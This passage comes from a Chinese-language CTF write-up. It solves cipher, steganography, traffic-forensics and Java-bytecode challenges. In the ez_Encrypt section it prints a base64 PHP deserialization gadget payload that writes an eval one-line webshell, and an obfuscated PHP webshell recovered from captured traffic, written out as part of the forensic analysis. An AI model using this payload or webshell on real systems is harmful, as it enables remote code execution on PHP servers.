&gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    x -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(j) == s[i]:</span><br><span class="line">            t += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += <span class="string">&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125;</span></span><br></pre></td></tr></table></figure><p><code>?</code> 改 <code>_</code> ，得到flag：<code>cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</code></p><p>​    </p><h3 id="无字天书"><a href="#无字天书" class="headerlink" title="无字天书"></a>无字天书</h3><p>在流量包中发现 <code>secret</code> 流量，dump得到gzip包，内容为一串16进制字符串，其中包含 <code>504B0304</code>，转存为zip文件，内含 <code>flag.txt</code> 和 <code>key.ws</code> 两个纯空白字符文件。</p><p><code>key.ws</code> 中包含空格与tab字符及大量换行符，为whitespace语言，<a href="https://ideone.com/l/whitespace">在线运行</a>得到输出 <code>XiAnWillBeSafe</code>；</p><p><code>flag.txt</code> 中包含大量空格与tab字符，为snow隐写，密码 <code>XiAnWillBeSafe</code>，解密：</p><p><code>SNOW.EXE -C -p XiAnWillBeSafe flag.txt</code>，得到flag：</p><p><code>cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</code></p><p>​    </p><h3 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h3><p>在流量包中发现 <code>secret.txt</code> 流量，dump下来base64解码得到zip文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>打开为拼图，共48张，选择带flag的部分图片纯手拼：</p><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/pintu.png" alt="pintu" style="zoom: 67%;"></p><p>flag：<code>cazy&#123;make_XiAN_great_Again&#125;</code></p><p>​    </p><h3 id="ez-Encrypt"><a href="#ez-Encrypt" class="headerlink" title="ez_Encrypt"></a>ez_Encrypt</h3><p>查看流量，发现是蚁剑流量，其中一个流中</p><p><code>TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D</code></p><p>base64解码为 <code>O:39:&quot;League\Flysystem\Cached\Storage\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\Flysystem\Adapter\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;</code>，</p><p>说明通过反序列化漏洞写入一句话木马。</p><p>找到一长串base64编码字符串，解码保存为 <code>www.zip</code> 源码，在 <code>app\controller\Index.php</code> 中找到混淆处理过的马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;IKlSux1227&#x27;</span>,<span class="keyword">__FILE__</span>);<span class="variable">$DusPFr</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;</span>);<span class="variable">$arCiCL</span>=<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$DusPFr</span>[<span class="number">6</span>].<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="variable">$VvUrBZ</span>=<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$DEomKk</span>=<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$DusPFr</span>[<span class="number">18</span>].<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$VvUrBZ</span>[<span class="number">1</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$LnpnvY</span>=<span class="variable">$DusPFr</span>[<span class="number">7</span>].<span class="variable">$DusPFr</span>[<span class="number">13</span>];<span class="variable">$arCiCL</span>.=<span class="variable">$DusPFr</span>[<span class="number">22</span>].<span class="variable">$DusPFr</span>[<span class="number">36</span>].<span class="variable">$DusPFr</span>[<span class="number">29</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>].<span class="variable">$DusPFr</span>[<span class="number">32</span>].<span class="variable">$DusPFr</span>[<span class="number">35</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="keyword">eval</span>(<span class="variable">$arCiCL</span>(<span class="string">&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试手动逐层解密，最后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C4zyC0m3On</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h3><p>zip压缩包根据提示爆破6位数字密码为 <code>220101</code>，解压有 <code>steg.pyc</code> 和 <code>flag.txt</code>。</p><p>用uncompyle6逆pyc发现无有意义代码，为pyc隐写，用stegosaurus工具解密：</p><p><code>python stegosaurus.py steg.pyc -x</code></p><p>得到密码 <code>Extracted payload: TheKey:St3g1sV3ryFuNny</code>。</p><p>再将 <code>flag.txt</code> 中emoji密文用emoji-aes解得到flag：<code>cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</code></p><p>​    </p><h3 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h3><blockquote><p>二进制</p></blockquote><p>文件头 <code>CAFEBABE</code> 说明为 <code>.class</code> Java字节码文件，用jadx查看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Main  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bArr = &#123;<span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span 